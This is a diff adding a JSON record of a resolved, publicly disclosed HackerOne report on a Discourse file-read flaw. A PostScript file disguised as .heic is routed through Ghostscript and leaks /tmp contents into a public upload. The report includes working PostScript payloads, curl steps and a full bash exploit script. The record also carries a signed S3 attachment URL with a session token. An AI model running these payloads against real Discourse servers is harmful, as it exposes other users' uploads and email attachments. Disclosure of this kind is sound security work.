@@ -1,0 +1,125 @@
+{
+  "id": 3738834,
+  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8zNzM4ODM0",
+  "url": "https://hackerone.com/reports/3738834",
+  "title": "Arbitrary `/tmp` read in  discourse via `convert_heif!` decoder-confusion (regression of 4bf3bf6786)",
+  "state": "Closed",
+  "substate": "resolved",
+  "severity_rating": "medium",
+  "readable_substate": "Resolved",
+  "created_at": "2026-05-15T17:58:29.189Z",
+  "submitted_at": "2026-05-15T17:58:30.058Z",
+  "is_member_of_team?": false,
+  "is_organization_group_member?": false,
+  "is_triager?": false,
+  "reporter": {
+    "disabled": false,
+    "username": "fizzi",
+    "url": "/fizzi",
+    "profile_picture_urls": {
+      "small": "/assets/avatars/default-14ffa99f59cd01423c64904352cc130ffcb6a802eadfd11777a54485749e60f2.png"
+    },
+    "is_me?": false,
+    "cleared": false,
+    "verified": true,
+    "hackerone_triager": false,
+    "hacker_mediation": false
+  },
+  "team": {
+    "id": 16893,
+    "url": "https://hackerone.com/discourse",
+    "handle": "discourse",
+    "profile_picture_urls": {
+      "small": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./dd1dfc8fc7352772e4a8994c07e1d628d34edc74db48377c707f10829dc23d53",
+      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/016/893/0bc08a2076b0f1f4a2c58636b8171b32cc367a52_original./2a499a0b732abf809ef45635d9ad400431480fafd17452e700cbdba6fd64fe85"
+    },
+    "permissions": [],
+    "submission_state": "open",
+    "default_currency": "usd",
+    "awards_miles": false,
+    "offers_bounties": true,
+    "state": "public_mode",
+    "only_cleared_hackers": false,
+    "pentest_feature_enabled?": false,
+    "pentest_retesting_ends_at": null,
+    "profile": {
+      "name": "Discourse",
+      "twitter_handle": "discourse",
+      "website": "https://discourse.org",
+      "about": "Discourse is JavaScript (ember.js) and Ruby on Rails based 100% open source discussion software -- https://github.com/discourse/discourse"
+    }
+  },
+  "has_bounty?": false,
+  "can_view_team": true,
+  "can_view_report": true,
+  "is_external_bug": false,
+  "is_published": false,
+  "is_participant": false,
+  "has_collaborators": false,
+  "submitted_by_team_member": false,
+  "submitted_with_assistant": true,
+  "stage": 4,
+  "public": true,
+  "visibility": "full",
+  "cve_ids": [],
+  "singular_disclosure_disabled": false,
+  "disclosed_at": "2026-10-26T03:43:07.430Z",
+  "bug_reporter_agreed_on_going_public_at": "2026-09-26T03:42:55.615Z",
+  "team_member_agreed_on_going_public_at": null,
+  "comments_closed?": false,
+  "facebook_team?": false,
+  "team_private?": false,
+  "vulnerability_information": "## Summary\n\n`convert_heif!` shells `magick` without `prepend_decoder!`, so ImageMagick dispatches by magic bytes. A `.heic` starting with `%!PS-Adobe` routes through the PostScript coder → Ghostscript (`-dSAFER`), which runs attacker PostScript: read any `/tmp` file with `file`/`readstring`, enumerate with `filenameforall`, paint via `show`. The rasterized JPG is stored as a normal upload and served at a public `/uploads/...` URL. One authenticated POST leaks; one anonymous GET retrieves. In-scope: other users' tempfiles (`RackMultipart*`, `discourse-email-attachment-*`, `image20*.jpg`, `magick-*`). Out-of-scope (SAFER): `/etc`, `/src`, `/proc`, `/home`, `/root`, `/var/log`, `/shared`. Regression of `4bf3bf6786` (2018) by `7559758e10` (#10079, 2020).\n\n## Description\n\n### Root cause\n\nIn 2018, commit `4bf3bf6786` (`SECURITY: force IM decoder based on file extension`) introduced `OptimizedImage.prepend_decoder!`:\n\n```ruby\n# app/models/optimized_image.rb:198\nIM_DECODERS = /\\A(jpe?g|png|ico|gif|webp|avif|svg)\\z/i\n\n# :200\ndef self.prepend_decoder!(path, ext_path = nil, opts = nil)\n  …\n  if !extension || !extension.match?(IM_DECODERS)\n    raise Discourse::InvalidAccess.new(\"Unsupported extension: #{extension}\")\n  end\n  \"#{extension}:#{path}\"\nend\n```\n\nEvery `magick` shell-out wraps source and target paths with `prepend_decoder!`, prepending an explicit decoder prefix (`jpeg:`, `png:`, …). This forces ImageMagick to use the extension-named decoder regardless of file magic bytes — the very class of bug `4bf3bf6786` was written to kill.\n\nIn 2020, commit `7559758e10` (#10079, *FEATURE: Support converting HEIF images to JPEG*) added HEIF/HEIC ingest. The new conversion path duplicates the structure of `convert_to_jpeg!` but **drops the two `prepend_decoder!` calls**:\n\n```ruby\n# lib/upload_creator.rb:370-371  (convert_to_jpeg! — SAFE)\nfrom = OptimizedImage.prepend_decoder!(from, nil, filename: \"image.#{@image_info.type}\")\nto   = OptimizedImage.prepend_decoder!(to)\n\n# lib/upload_creator.rb:408-424  (convert_heif! — REGRESSED)\ndef convert_heif!\n  jpeg_tempfile = Tempfile.new(%w[image .jpg])\n  from = @file.path\n  to   = jpeg_tempfile.path\n  OptimizedImage.ensure_safe_paths!(from, to)   # path traversal only\n\n  begin\n    execute_convert(from, to)\n  rescue StandardError\n    execute_convert(from, to, { debug: true })\n  end\n  …\nend\n```\n\n`ensure_safe_paths!` validates the path string is inside `Dir.tmpdir`; it does not influence decoder dispatch. With no prefix, `magick /tmp/x.heic /tmp/y.jpg` dispatches by **file magic bytes**, not by extension. A file named `.heic` whose first bytes are `%!PS-Adobe` is routed through ImageMagick's PostScript coder, which invokes Ghostscript via `/usr/local/etc/ImageMagick-7/delegates.xml`:\n\n```\n\"gs\" -sstdout=%%stderr -dQUIET -dSAFER -dBATCH -dNOPAUSE -dNOPROMPT\n     -dMaxBitmap=500000000 -dAlignToPixels=0 -dGridFitTT=2 …\n     -sDEVICE=\"pngalpha\" -r72x72 …\n```\n\nGhostscript 10.0.0 under `-dSAFER` permits filesystem reads under `/tmp` and writes to its working directory but blocks `/etc`, `/proc`, `/home`, `/src`, `/var`, `/shared`, `/sys` (see *Scope of the primitive* below). PostScript itself runs unrestricted inside that sandbox: `file`, `readstring`, `show`, `filenameforall` are all available.\n\nThe attacker reads any file Discourse leaves in `/tmp` — their own and other users' in-flight tempfiles, inbound email attachments, conversion intermediates — enumerates `/tmp` via `filenameforall` to discover the names, and renders the contents into the JPG that Discourse stores as a normal upload row.\n\n**The stored JPG is the exfil channel.** Discourse serves it from `/uploads/default/original/1X/<sha>.jpeg` with no auth check (every Discourse image works this way so logged-out visitors can render posts), and the attacker reads the URL straight from their own `POST /uploads.json` response body.\n\n### Vulnerability flow\n\n1. **Upload:** Attacker uploads a file with extension `.heic` and PostScript bytes (`%!PS-Adobe-3.0`) via `POST /uploads.json` (`type=composer&synchronous=true`).\n2. **Routing:** `UploadCreator#convert!` matches the extension (`File.extname(@filename).downcase.match?(/\\.hei(f|c)\\z/)`, L405) and calls `convert_heif!` at L408.\n3. **Decoder confusion:** `convert_heif!` shells `magick from to` without prepending `heic:` or `heif:`. ImageMagick sniffs the magic bytes, picks the PS coder, hands the file to Ghostscript via the delegates pipeline.\n4. **Ghostscript executes attacker PostScript:** under `-dSAFER`, with read access to `/tmp`. The script opens `/tmp/<victim-tempfile>`, reads up to 512 bytes, and renders them as visible text via `show`.\n5. **Storage:** Discourse stores Ghostscript's PNG/JPG output as a normal upload row with a SHA-named filename under `/uploads/default/original/1X/<sha>.jpeg`.\n6. **Exfiltration:** Attacker GETs `/uploads/default/original/1X/<sha>.jpeg` from any client — no auth, no cookie, no API key. Discourse upload routes are public assets (required for posts to render anonymously). The URL was already returned in the JSON body of step 1. The rendered text in the JPG is the leaked file content; the attacker reads it visually or via OCR (`tesseract` works on these single-line renders).\n\n## Reach\n\n| Lane | Status | Source |\n|---|---|---|\n| Authenticated (any logged-in user) | **Lab-verified end-to-end** | `POST /uploads.json` accepts `.heic`/`.heif`; default `authorized_extensions` site setting includes `heic` and `heif`. |\n| Anonymous via `email_in` | **Code-traced**, not lab-tested | `lib/email/receiver.rb:1398-1405` loops over `attachments`, writes each `attachment.body.decoded` to a tempfile whose **extension is taken straight from the MIME `Content-Disposition` filename header** (`File.extname(attachment.filename)`), then calls `UploadCreator.new(tmp, attachment.filename, opts).create_for(user.id)`. No account exists for the sender at this point; the path is reachable from any inbound mail when `email_in: true`. |\n\n## Proof of concept\n\nTested against `discourse/discourse_dev:release` at HEAD, ImageMagick 7.1.2-3, Ghostscript 10.0.0, Ruby 3.3.4. Reproduction needs only a logged-in Discourse session; replace `$URL` with the target's origin and use any valid session cookie or API key. Each step is one HTTP request.\n\n### (1) Build the payload (254 bytes, PostScript renamed `.heic`)\n\n```bash\ncat > /tmp/payload.heic <<'EOF'\n%!PS-Adobe-3.0\n%%BoundingBox: 0 0 1400 500\n1 1 1 setrgbcolor\n0 0 1400 500 rectfill\n0 0 0 setrgbcolor\n/Courier findfont 14 scalefont setfont\n20 480 moveto\n/y 480 def\n(/tmp/*) { dup show /y y 16 sub def 20 y moveto pop } 512 string filenameforall\nshowpage\nEOF\n```\n\nThe PostScript paints a white canvas, then iterates `/tmp/*` via the `filenameforall` operator, calling `show` on each entry to render the path as visible text.\n\n### (2) Authenticate as any active user, then `POST /uploads.json`\n\nUsing cookie session (CSRF token from `GET /session/csrf.json`, then `POST /session.json` with `login` + `password`; `/tmp/cj` is the local cookie jar):\n\n```bash\ncurl -fsS -b /tmp/cj -c /tmp/cj -X POST \"$URL/uploads.json\" \\\n  -H \"X-CSRF-Token: $CSRF\" -H 'X-Requested-With: XMLHttpRequest' \\\n  -F type=composer -F synchronous=true \\\n  -F \"file=@/tmp/payload.heic;filename=payload.heic;type=image/heic\"\n```\n\nServer returns HTTP 200 with the JSON body of the new upload row. The `url` field is the public path of the stored JPG (protocol-relative — join with `$URL` origin for the absolute URL). Example response:\n\n```json\n{\n  \"id\": 16,\n  \"url\": \"//host/uploads/default/original/1X/477a1fea29e5906bf11cd56d27f43b178fb9bd32.jpeg\",\n  \"filesize\": 104797,\n  \"width\": 1400,\n  \"height\": 500,\n  \"extension\": \"jpeg\"\n}\n```\n\nInternally: `UploadCreator#convert!` matches the `.heic` extension and calls `convert_heif!` at `lib/upload_creator.rb:408`. `convert_heif!` shells `magick /tmp/payload.heic /tmp/out.jpg` without a `prepend_decoder!` prefix. ImageMagick sniffs `%!PS-Adobe`, routes to the PostScript coder, invokes Ghostscript under `-dSAFER`. The PostScript runs, paints the `/tmp` listing on the canvas, GS rasterizes to PNG, ImageMagick wraps as JPG. Discourse stores the JPG as upload row 16.\n\n### (3) Fetch the stored JPG with **no auth** (uploads are public assets)\n\n```bash\ncurl -fsS -o /tmp/leaked.jpeg \"$URL/uploads/default/original/1X/477a1fea29e5906bf11cd56d27f43b178fb9bd32.jpeg\"\nfile /tmp/leaked.jpeg\n```\n\nNo cookies, no API key, no `Authorization` header — Discourse upload routes are unauthenticated by design (posts must render for logged-out visitors). The URL came straight from the JSON of step 2.\n\n### (4) Observe the leak\n\n```bash\nopen /tmp/leaked.jpeg     # or xdg-open\n```\n\nThe rendered text in the JPG is the live `/tmp` listing on the Discourse server. Typical entries include `/tmp/image20*.jpg` (`convert_to_jpeg!` / `convert_heif!` intermediates from other uploads), `/tmp/RackMultipart*` (in-flight multipart upload bodies), `/tmp/discourse-email-attachment-*` (inbound email attachments), `/tmp/magick-*` (concurrent ImageMagick scratch buffers), `/tmp/optimized_image*.jpg` (thumbnail intermediates).\n\n### (5) Read any listed file's contents (rerun with new payload)\n\nOnce the listing reveals a victim tempfile name, replace the `filenameforall` body with a `file`/`readstring`/`show` to exfiltrate up to 512 bytes per request:\n\n```postscript\n%!PS-Adobe-3.0\n%%BoundingBox: 0 0 1400 100\n1 1 1 setrgbcolor\n0 0 1400 100 rectfill\n0 0 0 setrgbcolor\n/Helvetica findfont 22 scalefont setfont\n20 40 moveto\n(/tmp/<exact-victim-filename>) (r) file 512 string readstring pop show\nshowpage\n```\n\nRepeat steps 2-4 with the new payload to render the file's contents into a JPG and fetch it. Multi-line files are read with a loop calling `readstring` until EOF; longer files are read in 512-byte chunks across multiple uploads.\n\n### Automated PoC\n\nSingle self-contained script — builds the PostScript `.heic`, performs CSRF + login + upload, then anonymous GET of the stored JPG:\n\n```bash\n#!/usr/bin/env bash\nset -euo pipefail\n\nURL=${URL:-http://localhost:3000}\nEMAIL=${EMAIL:-poc@test.local}\nPASSWORD=${PASSWORD:-PocAdmin12345678!}\n\nTMP=$(mktemp -d)\nCJ=$TMP/cj\n\ncat > \"$TMP/payload.heic\" <<'EOF'\n%!PS-Adobe-3.0\n%%BoundingBox: 0 0 1400 500\n1 1 1 setrgbcolor 0 0 1400 500 rectfill 0 0 0 setrgbcolor\n/Courier findfont 14 scalefont setfont\n20 480 moveto /y 480 def\n(/tmp/*) { dup show /y y 16 sub def 20 y moveto pop } 512 string filenameforall\nshowpage\nEOF\n\nCSRF=$(curl -fsS -c \"$CJ\" -b \"$CJ\" \"$URL/session/csrf.json\" \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  | python3 -c 'import json,sys;print(json.load(sys.stdin)[\"csrf\"])')\n\ncurl -fsS -c \"$CJ\" -b \"$CJ\" -X POST \"$URL/session.json\" \\\n  -H \"X-CSRF-Token: $CSRF\" -H 'X-Requested-With: XMLHttpRequest' \\\n  --data-urlencode \"login=$EMAIL\" --data-urlencode \"password=$PASSWORD\" >/dev/null\n\nCSRF=$(curl -fsS -c \"$CJ\" -b \"$CJ\" \"$URL/session/csrf.json\" \\\n  -H 'X-Requested-With: XMLHttpRequest' \\\n  | python3 -c 'import json,sys;print(json.load(sys.stdin)[\"csrf\"])')\n\nRESP=$(curl -fsS -b \"$CJ\" -c \"$CJ\" -X POST \"$URL/uploads.json\" \\\n  -H \"X-CSRF-Token: $CSRF\" -H 'X-Requested-With: XMLHttpRequest' \\\n  -F type=composer -F synchronous=true \\\n  -F \"file=@$TMP/payload.heic;filename=payload.heic;type=image/heic\")\n\necho \"$RESP\" | python3 -m json.tool | head -15\nREL=$(echo \"$RESP\" | python3 -c 'import json,sys;print(json.load(sys.stdin)[\"url\"])')\n\nrm -f \"$CJ\"\nFETCH=\"$URL/uploads/default/original/1X/$(basename \"$REL\")\"\necho \"Anon fetch: $FETCH\"\ncurl -fsS -o /tmp/leaked-listing.jpeg \"$FETCH\"\nfile /tmp/leaked-listing.jpeg\nopen /tmp/leaked-listing.jpeg 2>/dev/null || xdg-open /tmp/leaked-listing.jpeg 2>/dev/null || true\n```\n{F5926646}\n\n## Impact\n\n## Summary:\n - Cross-user /tmp read — RackMultipart* (other users' in-flight multipart bodies), discourse-email-attachment-* (inbound mail attachments), image20*.jpg / optimized_image*.jpg (conversion intermediates), magick-* (scratch\n   buffers), Sidekiq tempfiles.\n  - /tmp enumeration via PostScript filenameforall — no name guessing.\n  - Anonymous reach when email_in: true — attacker-controlled MIME filename → tempfile ext → UploadCreator → sink (code-traced, L1399-1405).",
+  "weakness": {
+    "id": 18,
+    "name": "Information Disclosure"
+  },
+  "original_report_id": null,
+  "original_report_url": null,
+  "attachments": [
+    {
+      "id": 5926646,
+      "file_name": "image.png",
+      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/mhr8k7polca0ks96e7es501vsuxj?response-content-disposition=attachment%3B%20filename%3D%22image.png%22%3B%20filename%2A%3DUTF-8%27%27image.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQQRGWDM2T%2F20261026%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20261026T071903Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEAcaCXVzLXdlc3QtMiJHMEUCICyEe14PQG2fhuFEqJs5YHpAqpWV5Qq9y2e%2BYxy18mvEAiEA3CzNiFN2%2FjbZWT1wjI6rRbk22hGlTgD0gDsmcj7Lv5QqugUIz%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FARADGgwwMTM2MTkyNzQ4NDkiDHIib5pNAWkagNvM1SqOBUsgiAjnaRtfsTIqyhuPdpTsfqNGr4DS23cZgdF3Ro3sn8YUKeeEhIk2h7pD%2BECvPzkvYIysyxaibefRs9QepmrqF9lP%2BcYIQuTpHIZ9VY0NsmegMG7AS5KhITFRG%2FLhHan%2F9rKvBqACGVL%2Fd5wQRknj3Ao35HJzaP27YfIz00eGoq%2FT4vmR2Aqju28JJdoZUdYjls4VtXXm1sMmyrvRnfgI4ajnGPCKlCiSUb1o3LUCjYv5fYh9DMQcx1THdj5Q%2BC6xGT349juJ2waqStFzAwWWnymCOxP2R3cwogUos1BKuR32Hn3orhJBAy5dFapADQKxWACaRmDUbEkw1gyMId%2BFsGotPyOr5%2FzOm19uySy5mHCSfucN5eGvybpGeBzUPjYpw9e8kEkZkOnUlSg%2FIa4hugwCH5kh3586RgwSq9rP8JXiKIowOLqGk%2FcwgWhgYbzjYgXoofa%2BnGDUgsOi7ywlCrGKM7R9LKfLIwKJsHos8%2BKh1q31C%2FLmZvu2eDWKJKGZQK%2Bigq82l8PjWvVVBk%2F%2FwGqrF56rBnWbcsT8e5cu1FciX9jt0xpPFLjV0LdKrVW%2Bv1yqDrEIuC5kG0NVWYEZzp439u5%2BxMTPx5f0SGJVeXyPQy2qbNzxB366pJkqudtkR%2FeaAq6D%2FTlZkXjjy6migzfisn5ysYaceUmQLawJ20FQ373Mi9ejfj8BnGEPVEWUaD4Yl1PMHxcDDsuTyVGTCep7C2qBYZtgzXKM3rchd3%2BLGaWfO3Mi7cL3XNNvl6lEcGK8VHVTyAW2dYXHAzg0%2FPLkzTfRCCRSv74Epr6CCHYwIbLiQYe4fcnIqMfO5KwaKnpNEFKDzsYgIScXvFb7UGO1h8W%2FiUk2gQpczjDL5%2FvWBjqxAY2AQMymX42TyZNpZlNo%2BQp%2B7c%2BTJ6Nt6O8Xy4NAWsse0bEXwGoCskFTB7oobNsaEUUe%2FtTOLTuhffIuPVBT5yarpq2HlkYm4S0KbvWDNE%2FWRCpr4Kb3xnmFJu6xEYfLf1FbyBHeKQoskv6aqm1PFT2wCEeRm0GKFOzvAifclPBS3dwuiG3pHKKs%2FPJQbX1nkLNT5u7ROhhugvHW7wmK13n%2B05o1BUoH2hGGwJ1CaHchkQ%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=9626ace584e81ff760c7e94dfe0fdefd60326e00e8a93154af53fbee93896332",
+      "file_size": 1288586,
+      "type": "image/png",
+      "moderated": false
+    }
+  ],
+  "allow_singular_disclosure_at": "2026-10-26T03:42:55.742Z",
+  "allow_singular_disclosure_after": -12967.989751683,
+  "singular_disclosure_allowed": true,
+  "vote_count": 2,
+  "voters": [
+    "thewindghost",
+    "iaap"
+  ],
+  "severity": {
+    "rating": "medium",
+    "author_type": "User"
+  },
+  "structured_scope": {
+    "databaseId": 665254,
+    "asset_type": "SOURCE_CODE",
+    "asset_identifier": "https://github.com/discourse/discourse",
+    "max_severity": "critical"
+  },
+  "abilities": {
+    "assignable_team_members": [],
+    "assignable_team_member_groups": []
+  },
+  "is_exploit_agent_supported?": false,
+  "is_linear_agent_ui_supported?": false,
+  "summaries": [
+    {
+      "category": "team",
+      "can_view?": true,
+      "can_create?": false
+    },
+    {
+      "category": "researcher",
+      "can_view?": true,
+      "can_create?": false
+    }
+  ]
+}
